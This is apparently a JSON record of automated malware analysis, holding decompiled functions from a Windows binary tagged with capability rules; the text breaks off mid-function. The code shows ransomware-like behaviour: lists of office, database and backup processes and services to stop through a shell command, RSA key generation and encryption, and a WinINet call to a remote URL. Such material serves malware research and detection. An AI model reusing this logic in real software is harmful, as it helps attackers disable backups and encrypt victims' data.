        "decompiled_code": "\nvoid fcn.00407577(void)\n\n{\n    char cVar1;\n    uint *in_EAX;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    uint32_t unaff_EDI;\n    uint var_4h;\n    \n    cVar1 = fcn.0040420d(0x414748);\n    if (cVar1 == '\\0') {\n        iVar2 = in_EAX[4];\n        if (-iVar2 - 1U <= unaff_EDI) {\n            iVar2 = fcn.00408332(\"string too long\");\n        }\n        if (unaff_EDI != 0) {\n            cVar1 = fcn.00403dd0(0);\n            if (cVar1 != '\\0') {\n                puVar3 = in_EAX;\n                puVar4 = in_EAX;\n                if (7 < in_EAX[5]) {\n                    puVar3 = *in_EAX;\n                    puVar4 = *in_EAX;\n                }\n                fcn.00408a00(puVar3 + unaff_EDI * 2, puVar4, in_EAX[4] * 2);\n                puVar4 = in_EAX;\n                if (7 < in_EAX[5]) {\n                    puVar4 = *in_EAX;\n                }\n                fcn.00408410(puVar4, 0x414748, unaff_EDI * 2);\n                in_EAX[4] = iVar2 + unaff_EDI;\n                if (7 < in_EAX[5]) {\n                    in_EAX = *in_EAX;\n                }\n                *(in_EAX + (iVar2 + unaff_EDI) * 2) = 0;\n            }\n        }\n    }\n    else {\n        puVar4 = in_EAX;\n        if (7 < in_EAX[5]) {\n            puVar4 = *in_EAX;\n        }\n        fcn.004048bb(in_EAX, 0x414748 - puVar4 >> 1);\n    }\n    return;\n}\n",
        "token_count": 453
    },
    "00407641": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040786c)\n// WARNING: Removing unreachable block (ram,0x0040786f)\n\nvoid fcn.00407641(void)\n\n{\n    uint arg_ch;\n    uint *puVar1;\n    char *arg_8h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00403597(0x414764);\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"winword\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"wordpad\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"outlook\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"thunderbird\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"oracle\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"excel\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"onenote\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"virtualboxvm\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"node\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"QBW32\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"WBGX\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"Teams\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"Flow\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00406ae3(0x4147f8);\n    arg_ch = fcn.0040a2c0(0x413b71);\n    fcn.00406de1(0x413b71, arg_ch);\n    puVar1 = fcn.0040525e(\" /c \");\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    arg_8h = \"open\";\n    (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, \"open\", 0x413b00, puVar1, 0, 0);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040131d();\n    fcn.004083f8(arg_8h);\n    return;\n}\n",
        "token_count": 743
    },
    "0040793c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00407bad)\n// WARNING: Removing unreachable block (ram,0x00407bb0)\n\nvoid fcn.0040793c(void)\n\n{\n    uint arg_ch;\n    uint *puVar1;\n    char *arg_8h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_2ch;\n    uint var_28h;\n    uint var_20h;\n    uint var_4h;\n    \n    fcn.00403597(\"DbxSvc\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"OracleXETNSListener\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"OracleServiceXE\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"AcrSch2Svc\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"AcronisAgent\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"Apache2.4\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"SQLWriter\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"MSSQL$SQLEXPRESS\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"MSSQLServerADHelper100\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"MongoDB\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"SQLAgent$SQLEXPRESS\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"SQLBrowser\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"CobianBackup11\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"cbVSCService11\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"QBCFMontorService\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00403597(\"QBVSS\");\n    fcn.00403832();\n    fcn.0040135c(1);\n    fcn.00406ae3(0x4147f8);\n    arg_ch = fcn.0040a2c0(0x413b71);\n    fcn.00406de1(0x413b71, arg_ch);\n    puVar1 = fcn.0040525e(\" /c \");\n    if (0xf < puVar1[5]) {\n        puVar1 = *puVar1;\n    }\n    arg_8h = \"open\";\n    (*_sym.imp.SHELL32.dll_ShellExecuteA)(0, \"open\", 0x413b00, puVar1, 0, 0);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.0040131d();\n    fcn.004083f8(arg_8h);\n    return;\n}\n",
        "token_count": 841
    },
    "00407e9c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00407e9c(uint arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, int32_t arg_34h, uint32_t arg_38h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint arg_8h_00;\n    uint in_stack_ffffff7c;\n    uint in_stack_ffffff80;\n    uint in_stack_ffffff84;\n    uint in_stack_ffffff88;\n    uint in_stack_ffffff8c;\n    uint in_stack_ffffff94;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    puVar2 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar2 = &arg_24h;\n    }\n    puVar2 = puVar2 + arg_34h;\n    puVar4 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar4 = &arg_24h;\n    }\n    for (; puVar4 != puVar2; puVar4 = puVar4 + 1) {\n        if (*puVar4 == '+') {\n            *puVar4 = '.';\n        }\n    }\n    uVar3 = (*_sym.imp.WININET.dll_InternetOpenA)(\"Naruto Uzumake\", 0, 0, 0, 0);\n    puVar2 = &arg_24h;\n    puVar4 = &arg_8h;\n    fcn.00403573(puVar4);\n    fcn.00407d97(puVar4, in_stack_ffffff7c, in_stack_ffffff80, in_stack_ffffff84, in_stack_ffffff88, in_stack_ffffff8c);\n    puVar4 = fcn.004043c4(&var_20h, in_stack_ffffff94);\n    if (0xf < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    arg_8h_00 = (*_sym.imp.WININET.dll_InternetOpenUrlA)(uVar3, puVar4, 0, 0, 0x80000000, 0, puVar2);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    pcVar1 = _sym.imp.WININET.dll_InternetCloseHandle;\n    (*_sym.imp.WININET.dll_InternetCloseHandle)(uVar3);\n    (*pcVar1)();\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 692
    },
    "0040aed7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040aed7(uint arg_8h)\n\n{\n    fcn.0040ad97(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040c571": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040c585)\n// WARNING: Removing unreachable block (ram,0x0040c58b)\n// WARNING: Removing unreachable block (ram,0x0040c58d)\n\nvoid fcn.0040c571(void)\n\n{\n    return;\n}\n",
        "token_count": 66
    },
    "0040e935": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040e935(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    uint in_EAX;\n    uint uVar1;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = fcn.0040fa39(arg_8h, arg_ch, arg_10h, arg_14h, in_EAX, 0, 0, 0);\n    return uVar1;\n}\n",
        "token_count": 111
    },
    "004043e8": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004043e8(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(param_1 + 0x14) - *(param_1 + 0x10) < *(in_EAX + 0x10)) &&\n       (*(param_1 + 0x10) <= *(in_EAX + 0x14) - *(in_EAX + 0x10))) {\n        fcn.004046af(param_1);\n    }\n    else {\n        fcn.0040458b(in_EAX, 0);\n    }\n    fcn.004035c3();\n    return;\n}\n",
        "token_count": 144
    },
    "00404453": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00404453(int32_t param_1)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(param_1 + 0x14) - *(param_1 + 0x10) < *(in_EAX + 0x10)) &&\n       (*(param_1 + 0x10) <= *(in_EAX + 0x14) - *(in_EAX + 0x10))) {\n        fcn.004048bb(param_1, 0);\n    }\n    else {\n        fcn.00404786(in_EAX, 0);\n    }\n    fcn.004044e5();\n    return;\n}\n",
        "token_count": 145
    },
    "00405c6a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.00405c6a(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_218h;\n    uint var_214h;\n    uint var_210h;\n    uint var_20ch;\n    uint var_208h;\n    uint var_204h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    var_214h = arg_8h;\n    var_218h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_204h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_208h = 0;\n    arg_8h_00 = *0x417af4;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x417af4, 0, 1, 0, 0, &var_208h, 0);\n    if (iVar3 != 0) goto code_r0x00405cf0;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00405cf0:\n                iVar3 = (*pcVar5)(*0x417af4, 0, 1, 0, &var_204h, &var_218h, var_208h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            var_20ch = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_204h, var_208h, 1, 0, &var_20ch);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        var_210h = fcn.004083ed(var_20ch);\n        iVar3 = (*pcVar1)(&var_204h, var_208h, 1, var_210h, &var_20ch);\n    } while (iVar3 == 0);\n    fcn.00403597(var_210h);\n    fcn.0040a3ea(var_210h);\n    fcn.0040135c(1);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 738
    },
    "004067a4": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004067a4(uint arg_8h, uint *arg_ch, uint noname_2, uint noname_3, uint noname_4, int32_t arg_1ch, uint32_t arg_20h)\n\n{\n    code *pcVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    code *pcVar5;\n    uint arg_8h_00;\n    int32_t var_418h;\n    uint var_414h;\n    uint var_410h;\n    uint var_40ch;\n    uint var_408h;\n    uint var_404h;\n    uint32_t var_4h;\n    \n    pcVar5 = _sym.imp.ADVAPI32.dll_CryptEncrypt;\n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    var_414h = arg_8h;\n    var_418h = arg_1ch;\n    puVar4 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar4 = &arg_ch;\n    }\n    puVar4 = puVar4 + arg_1ch;\n    puVar2 = arg_ch;\n    if (arg_20h < 0x10) {\n        puVar2 = &arg_ch;\n    }\n    if (puVar2 != puVar4) {\n        iVar3 = &var_404h - puVar2;\n        do {\n            *(iVar3 + puVar2) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar4);\n    }\n    var_408h = 0;\n    arg_8h_00 = *0x417af8;\n    iVar3 = (*_sym.imp.ADVAPI32.dll_CryptEncrypt)(*0x417af8, 0, 1, 0, 0, &var_408h, 0);\n    if (iVar3 != 0) goto code_r0x0040682a;\n    do {\n        do {\n            do {\n                (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x0040682a:\n                iVar3 = (*pcVar5)(*0x417af8, 0, 1, 0, &var_404h, &var_418h, var_408h);\n                pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n            } while (iVar3 == 0);\n            var_40ch = 0;\n            iVar3 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(&var_404h, var_408h, 1, 0, &var_40ch);\n            pcVar5 = pcVar1;\n        } while (iVar3 == 0);\n        var_410h = fcn.004083ed(var_40ch);\n        iVar3 = (*pcVar1)(&var_404h, var_408h, 1, var_410h, &var_40ch);\n    } while (iVar3 == 0);\n    fcn.00403597(var_410h);\n    fcn.0040a3ea(var_410h);\n    fcn.0040135c(1);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 737
    },
    "00407d97": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "terminate process",
            "encrypt or decrypt via WinCrypt"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00407d97(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint arg_18h, uint32_t arg_1ch)\n\n{\n    code *pcVar1;\n    uint *arg_8h_00;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar *in_ECX;\n    uint32_t uVar4;\n    uint uVar5;\n    uint var_2ch;\n    uint pbData;\n    uint32_t pdwDataLen;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    pcVar1 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    var_4h = *0x416084 ^ &stack0xfffffffc;\n    uVar4 = 0;\n    pdwDataLen = 0;\n    arg_8h_00 = arg_8h;\n    if (arg_1ch < 0x10) {\n        arg_8h_00 = &arg_8h;\n    }\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(arg_8h_00, arg_18h, 1, 0, &pdwDataLen, 0, 0);\n    if (iVar2 != 0) goto code_r0x00407de1;\n    uVar5 = 7;\n    while( true ) {\n        while( true ) {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(uVar5);\ncode_r0x00407de1:\n            uVar5 = fcn.004083ed(pdwDataLen);\n            puVar3 = arg_8h;\n            if (arg_1ch < 0x10) {\n                puVar3 = &arg_8h;\n            }\n            iVar2 = (*pcVar1)(puVar3, arg_18h, 1, uVar5, &pdwDataLen, 0, 0);\n            if (iVar2 != 0) break;\n            uVar5 = 8;\n        }\n        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptDecrypt)(*0x417b00, 0, 1, 0, uVar5, &pdwDataLen);\n        if (iVar2 != 0) break;\n        uVar5 = 9;\n    }\n    *(in_ECX + 0x14) = 0xf;\n    *(in_ECX + 0x10) = 0;\n    *in_ECX = 0;\n    fcn.00403597(uVar5);\n    if (pdwDataLen != 0) {\n        do {\n            puVar3 = var_20h;\n            if (var_ch < 0x10) {\n                puVar3 = &var_20h;\n            }\n            fcn.004035db(*(puVar3 + uVar4));\n            uVar4 = uVar4 + 1;\n        } while (uVar4 < pdwDataLen);\n    }\n    fcn.0040a3ea(uVar5);\n    fcn.0040135c(1);\n    fcn.0040135c(1);\n    fcn.004083f8(arg_8h_00);\n    return;\n}\n",
        "token_count": 732
    },
    "00407f7a": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00407f7a(uint arg_8h)\n\n{\n    int32_t iVar1;\n    code *pcVar2;\n    uint *in_EAX;\n    uint *puVar3;\n    uint32_t uVar4;\n    uint arg_8h_00;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.KERNEL32.dll_MultiByteToWideChar;\n    iVar1 = in_EAX[4];\n    puVar3 = in_EAX;\n    if (0xf < in_EAX[5]) {\n        puVar3 = *in_EAX;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_MultiByteToWideChar)(0, 0, puVar3, iVar1 + 1, 0, 0);\n    arg_8h_00 = fcn.004083ed(-(uVar4 * 2 >> 0x20 != 0) | uVar4 * 2);\n    if (0xf < in_EAX[5]) {\n        in_EAX = *in_EAX;\n    }\n    (*pcVar2)(0, 0, in_EAX, iVar1 + 1, arg_8h_00, uVar4);\n    fcn.00403779(arg_8h_00);\n    fcn.0040a3ea(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 321
    },
    "0040dd74": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040dd74(int32_t arg_8h)\n\n{\n    if ((arg_8h != 0) && (*(arg_8h + -8) == 0xdddd)) {\n        fcn.0040b12f(arg_8h + -8);\n    }\n    return;\n}\n",
        "token_count": 71
    },
    "0040599f": {
        "rules": [
            "encode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.0040599f(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint uVar4;\n    uint arg_8h;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n    var_ch = 0;\n    var_8h = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)\n                      (0x417af0, 0, \"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 0);\n    if (iVar2 != 0) goto code_r0x004059e3;\n    iVar2 = (*pcVar1)(0x417af0, 0, \"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 8);\n    if (iVar2 != 0) goto code_r0x004059e3;\n    do {\n        do {\n            do {\n                do {\n                    do {\n                        do {\n                            do {\n                                do {\n                                    do {\n                                        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x004059e3:\n                                        iVar2 = (*_sym.imp.ADVAPI32.dll_CryptGenKey)(*0x417af0, 1, 0x8000001, 0x417af4);\n                                        pcVar1 = _sym.imp.ADVAPI32.dll_CryptExportKey;\n                                    } while (iVar2 == 0);\n                                    iVar2 = (*_sym.imp.ADVAPI32.dll_CryptExportKey)(*0x417af4, 0, 7, 0, 0, &var_ch);\n                                } while (iVar2 == 0);\n                                uVar3 = fcn.004083ed(var_ch);\n                                iVar2 = (*pcVar1)(*0x417af4, 0, 7, 0, uVar3, &var_ch);\n                            } while (iVar2 == 0);\n                            iVar2 = (*pcVar1)(*0x417af4, 0, 6, 0, 0, &var_8h);\n                        } while (iVar2 == 0);\n                        uVar4 = fcn.004083ed(var_8h);\n                        iVar2 = (*pcVar1)(*0x417af4, 0, 6, 0, uVar4, &var_8h);\n                        pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n                    } while (iVar2 == 0);\n                    var_4h = 0;\n                    iVar2 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(uVar4, var_8h, 1, 0, &var_4h);\n                } while (iVar2 == 0);\n                arg_8h = fcn.004083ed(var_4h);\n                iVar2 = (*pcVar1)(uVar4, var_8h, 1, arg_8h, &var_4h);\n            } while (iVar2 == 0);\n            fcn.0040a2c0(arg_8h);\n            fcn.00403be0();\n            fcn.0040a3ea(arg_8h);\n            var_4h = 0;\n            iVar2 = (*pcVar1)(uVar3, var_ch, 1, 0, &var_4h);\n        } while (iVar2 == 0);\n        uVar4 = fcn.004083ed(var_4h);\n        iVar2 = (*pcVar1)(uVar3, var_ch, 1, uVar4, &var_4h);\n    } while (iVar2 == 0);\n    fcn.0040a2c0(uVar4);\n    fcn.00403be0();\n    fcn.0040a3ea(uVar4);\n    return;\n}\n",
        "token_count": 887
    },
    "00405b36": {
        "rules": [
            "encode data using Base64 via WinAPI",
            "contain loop",
            "terminate process"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405b36(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint arg_8h_00;\n    uint var_4h;\n    \n    pcVar1 = _sym.imp.CRYPT32.dll_CryptBinaryToStringA;\n    var_4h = 0;\n    iVar2 = (*_sym.imp.CRYPT32.dll_CryptBinaryToStringA)(arg_ch, arg_10h, 1, 0, &var_4h);\n    if (iVar2 != 0) goto code_r0x00405b62;\n    do {\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00405b62:\n        arg_8h_00 = fcn.004083ed(var_4h);\n        iVar2 = (*pcVar1)(arg_ch, arg_10h, 1, arg_8h_00, &var_4h);\n    } while (iVar2 == 0);\n    fcn.00403597(arg_8h_00);\n    fcn.0040a3ea(arg_8h_00);\n    return arg_8h;\n}\n",
        "token_count": 270
    },
    "00405b97": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.00405b97(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint pbData;\n    uint dwDataLen;\n    \n    pcVar6 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    dwDataLen = 0;\n    uVar5 = 0x416c38;\n    uVar2 = *0x416c38;\n    if (*0x416c4c < 0x10) {\n        uVar2 = 0x416c38;\n    }\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2, *0x416c48, 1, 0, &dwDataLen, 0, 0);\n    if (iVar3 != 0) goto code_r0x00405bdc;\ncode_r0x00405bd5:\n    do {\n        do {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00405bdc:\n            uVar4 = fcn.004083ed(dwDataLen);\n            uVar2 = *0x416c38;\n            if (*0x416c4c < 0x10) {\n                uVar2 = uVar5;\n            }\n            iVar3 = (*pcVar6)(uVar2, *0x416c48, 1, uVar4, &dwDataLen, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n        } while (iVar3 == 0);\n        if (*0x417af0 == 0) {\n            uVar5 = 0x417af0;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)\n                              (0x417af0, 0, \"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 0);\n            pcVar6 = pcVar1;\n            if (iVar3 == 0) {\n                iVar3 = (*pcVar1)(0x417af0, 0, \"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 8);\n                if (iVar3 == 0) goto code_r0x00405bd5;\n            }\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(*0x417af0, uVar4, dwDataLen, 0, 0, 0x417af4);\n        if (iVar3 != 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 588
    },
    "00405dad": {
        "rules": [
            "decode data using Base64 via WinAPI"
        ],
        "decompiled_code": "\nvoid fcn.00405dad(void)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint uVar5;\n    code *pcVar6;\n    uint pbData;\n    uint dwDataLen;\n    \n    pcVar6 = _sym.imp.CRYPT32.dll_CryptStringToBinaryA;\n    dwDataLen = 0;\n    uVar5 = 0x416c1c;\n    uVar2 = *0x416c1c;\n    if (*0x416c30 < 0x10) {\n        uVar2 = 0x416c1c;\n    }\n    iVar3 = (*_sym.imp.CRYPT32.dll_CryptStringToBinaryA)(uVar2, *0x416c2c, 1, 0, &dwDataLen, 0, 0);\n    if (iVar3 != 0) goto code_r0x00405df2;\ncode_r0x00405deb:\n    do {\n        do {\n            (*_sym.imp.KERNEL32.dll_ExitProcess)(0);\ncode_r0x00405df2:\n            uVar4 = fcn.004083ed(dwDataLen);\n            uVar2 = *0x416c1c;\n            if (*0x416c30 < 0x10) {\n                uVar2 = uVar5;\n            }\n            iVar3 = (*pcVar6)(uVar2, *0x416c2c, 1, uVar4, &dwDataLen, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CryptAcquireContextA;\n        } while (iVar3 == 0);\n        if (*0x417afc == 0) {\n            uVar5 = 0x417afc;\n            iVar3 = (*_sym.imp.ADVAPI32.dll_CryptAcquireContextA)\n                              (0x417afc, 0, \"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 0);\n            pcVar6 = pcVar1;\n            if (iVar3 == 0) {\n                iVar3 = (*pcVar1)(0x417afc, 0, \"Microsoft Enhanced Cryptographic Provider v1.0\", 1, 8);\n                if (iVar3 == 0) goto code_r0x00405deb;\n            }\n        }\n        iVar3 = (*_sym.imp.ADVAPI32.dll_CryptImportKey)(*0x417afc, uVar4, dwDataLen, 0, 0, 0x417af8);\n        if (iVar3 != 0) {\n            return;\n        }\n    } while( true );\n}\n",
        "token_count": 584
    },
    "004068e7": {
        "rules": [
            "create or open registry key"
        ],
        "decompiled_code": "\nvoid __cdecl\nfcn.004068e7(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch, uint noname_6, \n            uint *arg_24h, uint noname_8, uint noname_9, uint noname_10, int32_t cbData, uint32_t arg_38h)\n\n{\n    int32_t arg_8h_00;\n    uint *puVar1;\n    uint *puVar2;\n    int32_t iVar3;\n    uint hKey;\n    \n    arg_8h_00 = fcn.004083ed(cbData);\n    puVar2 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar2 = &arg_24h;\n    }\n    puVar2 = puVar2 + cbData;\n    puVar1 = arg_24h;\n    if (arg_38h < 0x10) {\n        puVar1 = &arg_24h;\n    }\n    if (puVar1 != puVar2) {\n        iVar3 = arg_8h_00 - puVar1;\n        do {\n            *(iVar3 + puVar1) = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (puVar1 != puVar2);\n    }\n    (*_sym.imp.ADVAPI32.dll_RegCreateKeyExA)(0x80000001, 0x41458c, 0, 0, 1, 0x20006, 0, &hKey, 0);\n    puVar2 = arg_8h;\n    if (arg_1ch < 0x10) {\n        puVar2 = &arg_8h;\n    }\n    